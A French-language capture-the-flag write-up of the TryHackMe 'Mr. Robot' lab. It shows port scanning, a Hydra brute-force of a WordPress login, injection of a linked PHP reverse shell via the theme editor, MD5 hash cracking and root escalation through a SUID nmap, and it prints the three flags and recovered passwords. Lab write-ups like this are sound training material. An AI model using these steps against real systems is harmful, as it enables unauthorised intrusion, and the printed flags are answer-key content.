# Mr. Robot — CTF Writeup

> **Plateforme :** TryHackMe  
> **Difficulté :** Medium  
> **Objectif :** Récupérer les 3 clés cachées sur la machine  

---

## Sommaire

1. [Reconnaissance](#1-reconnaissance)
2. [Énumération web](#2-énumération-web)
3. [Obtention du premier flag](#3-obtention-du-premier-flag)
4. [Accès au panel WordPress](#4-accès-au-panel-wordpress)
5. [Reverse Shell & accès initial](#5-reverse-shell--accès-initial)
6. [Élévation de privilèges — user robot](#6-élévation-de-privilèges--user-robot)
7. [Élévation de privilèges — root](#7-élévation-de-privilèges--root)
8. [Récapitulatif des flags](#8-récapitulatif-des-flags)

---

## 1. Reconnaissance

On commence par un scan Nmap pour identifier les services exposés sur la cible.

```bash
nmap -sCV 10.49.165.111
```

![Scan Nmap](images/01_nmap.png)

**Résultat :**

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13
80/tcp  open  http     Apache httpd
443/tcp open  ssl/http Apache httpd
```

Trois ports ouverts :
- **22** — SSH (OpenSSH 8.2p1)
- **80** — HTTP (Apache)
- **443** — HTTPS (Apache, certificat auto-signé `www.example.com`)

---

## 2. Énumération web

En accédant à l'IP via un navigateur, on arrive sur un site avec un shell interactif inspiré de la série Mr. Robot.

![Page d'accueil](images/02_homepage.png)

On énumère les sous-répertoires avec **dirsearch** :

```bash
dirsearch -u http://10.49.165.111
```

![Résultat dirsearch](images/03_dirsearch.png)

L'outil révèle de nombreux répertoires et confirme que le site tourne sous **WordPress**.

On consulte ensuite le fichier `robots.txt` :

```bash
curl http://10.49.165.111/robots.txt
```

![robots.txt](images/04_robots.png)

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

Deux ressources intéressantes sont exposées directement dans ce fichier.

---

## 3. Obtention du premier flag

```bash
curl http://10.49.165.111/key-1-of-3.txt
```

![Flag 1](images/05_flag1.png)

🚩 **Flag 1 :** `073403c8a58a1f80d943455fb30724b9`

On récupère également la wordlist mentionnée dans `robots.txt` :

```bash
curl http://10.49.165.111/fsocity.dic > wordlist.txt
wc -l wordlist.txt
# 858160 entrées
```

La liste contient énormément de doublons. On la trie et déduplique pour optimiser les attaques futures :

```bash
sort -u wordlist.txt > sorted.txt
wc -l sorted.txt
# 11451 entrées uniques
```

![Déduplication wordlist](images/06_wordlist_sort.png)

---

## 4. Accès au panel WordPress

### Identification du nom d'utilisateur

En testant quelques identifiants basiques sur `/wp-login.php`, on remarque que les messages d'erreur diffèrent selon que le nom d'utilisateur existe ou non — une fuite d'information classique sur WordPress.

![Message d'erreur WordPress](images/07_wp_login_error.png)

En lien avec le thème du CTF, on teste les noms des personnages principaux de la série. Le nom `elliot` génère un message d'erreur différent, confirmant son existence.

### Bruteforce du mot de passe

On utilise **Hydra** avec notre wordlist réduite :

```bash
hydra -l elliot -P sorted.txt 10.49.165.111 http-post-form \
  "/wp-login.php:log=^USER^&pwd=^PASS^:F=incorrect" -I
```

![Résultat Hydra](images/08_hydra.png)

```
[80][http-post-form] host: 10.49.165.111   login: elliot   password: ER28-0652
```

**Credentials trouvés :** `elliot : ER28-0652`

> Note : un test SSH avec ces credentials échoue, ils sont spécifiques à WordPress.

---

## 5. Reverse Shell & accès initial

Une fois connecté au dashboard WordPress en tant qu'`elliot`, on constate un accès au **Theme Editor** et au **Plugin Editor**.

![Dashboard WordPress](images/09_wp_dashboard.png)

On injecte un reverse shell PHP classique via l'éditeur de thème :

> Reverse shell utilisé : [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell)

![Injection du reverse shell](images/10_reverse_shell_inject.png)

Après exécution, on obtient un shell et on le stabilise :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![Shell obtenu](images/11_shell.png)

---

## 6. Élévation de privilèges — user robot

On explore le répertoire `/home` et on découvre l'utilisateur `robot` avec un fichier de mot de passe hashé.

![Hash robot](images/12_robot_hash.png)

Le hash MD5 est cracké à l'aide de **CapyCracker** avec la wordlist `rockyou.txt` :

```bash
python3 CapyCracker.py --algo md5 \
  --hash c3fcd3d76192e4007dfb496cca67e13b \
  --mode dict \
  --wordlist /usr/share/wordlists/rockyou.txt
```

![CapyCracker résultat](images/13_capycracker.png)

```
TROUVÉ : c3fcd3d76192e4007dfb496cca67e13b => 'abcdefghijklmnopqrstuvwxyz'
```

On se connecte en tant que `robot` et on récupère le second flag :

```bash
su robot
cat key-2-of-3.txt
```

![Flag 2](images/14_flag2.png)

🚩 **Flag 2 :** `822c73956184f694993bede3eb39f959`

---

## 7. Élévation de privilèges — root

### Vecteurs testés

```bash
sudo -l
# Résultat : robot n'a pas de droits sudo
```

```bash
find / -perm -4000 -type f 2>/dev/null
```

![SUID binaries](images/15_suid.png)

Parmi les binaires SUID listés, on repère **nmap** — ce qui est inhabituel :

```
/usr/local/bin/nmap
```

### Exploitation via GTFOBins

On consulte [GTFOBins — nmap](https://gtfobins.github.io/gtfobins/nmap/) et on utilise le mode interactif disponible dans les anciennes versions de nmap :

```bash
nmap --interactive
```

```
nmap> !sh
```

![Root obtenu](images/16_root.png)

```
# id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```

On est root. On récupère le dernier flag :

```bash
cat /root/key-3-of-3.txt
```

![Flag 3](images/17_flag3.png)

🚩 **Flag 3 :** `04787ddef27c3dee1ee161b21670b4e4`

---

## 8. Récapitulatif des flags

| Flag | Localisation | Valeur |
|------|-------------|--------|
| 🚩 Key 1 | `/key-1-of-3.txt` (web) | `073403c8a58a1f80d943455fb30724b9` |
| 🚩 Key 2 | `/home/robot/key-2-of-3.txt` | `822c73956184f694993bede3eb39f959` |
| 🚩 Key 3 | `/root/key-3-of-3.txt` | `04787ddef27c3dee1ee161b21670b4e4` |

---

## Outils utilisés

| Outil | Usage |
|-------|-------|
| `nmap` | Scan de ports et détection de services |
| `dirsearch` | Énumération de répertoires web |
| `curl` | Récupération de fichiers HTTP |
| `hydra` | Bruteforce du formulaire WordPress |
| `CapyCracker` | Crack de hash MD5 |
| GTFOBins | Référence pour l'exploitation des SUID |

---
